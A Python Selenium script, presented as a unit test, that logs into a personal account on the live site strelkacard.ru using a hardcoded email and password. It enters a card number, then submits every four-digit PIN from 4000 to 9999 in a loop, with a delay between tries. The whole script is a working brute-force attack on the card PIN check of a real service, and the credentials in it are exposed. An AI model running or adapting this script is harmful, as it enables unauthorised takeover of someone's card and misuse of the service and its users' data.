# -*- coding: utf-8 -*-
from selenium.webdriver.firefox.webdriver import WebDriver
from selenium.webdriver.common.action_chains import ActionChains
import time, unittest
import time

def is_alert_present(wd):
    try:
        wd.switch_to_alert().text
        return True
    except:
        return False

class strelkacard(unittest.TestCase):
    def setUp(self):
        self.wd = WebDriver()
        self.wd.implicitly_wait(60)
    
    def test_strelkacard(self):

        testdata = [
            (str(n1)+str(n2)+str(n3)+str(n4))
            for n1 in range (4,10)
            for n2 in range (10)
            for n3 in range (10)
            for n4 in range (10)
        ]
        success = True
        wd = self.wd
        wd.get("http://strelkacard.ru/")
        wd.find_element_by_link_text("ВОЙТИ В ЛИЧНЫЙ КАБИНЕТ").click()
        wd.find_element_by_name("username").click()
        wd.find_element_by_name("username").clear()
        wd.find_element_by_name("username").send_keys("vananova@mail.ru")
        wd.find_element_by_name("password").click()
        wd.find_element_by_name("password").clear()
        wd.find_element_by_name("password").send_keys("ii484801")
        wd.find_element_by_xpath("//div[@class='header-auth']//button[.='Войти']").click()
        wd.find_element_by_link_text("ДОБАВИТЬ КАРТУ").click()
        wd.find_element_by_name("cardnum").click()
        wd.find_element_by_name("cardnum").clear()
        wd.find_element_by_name("cardnum").send_keys("0333 1970 950")
        for i in testdata:
            wd.find_element_by_name("cardpin").click()
            wd.find_element_by_name("cardpin").clear()
            wd.find_element_by_name("cardpin").send_keys(i)
            wd.find_element_by_xpath("//div[@class='header-addcard-footer']//button[.='Добавить']").click()
            time.sleep(7)

        self.assertTrue(success)
    
    def tearDown(self):
        self.wd.quit()

if __name__ == '__main__':
    unittest.main()
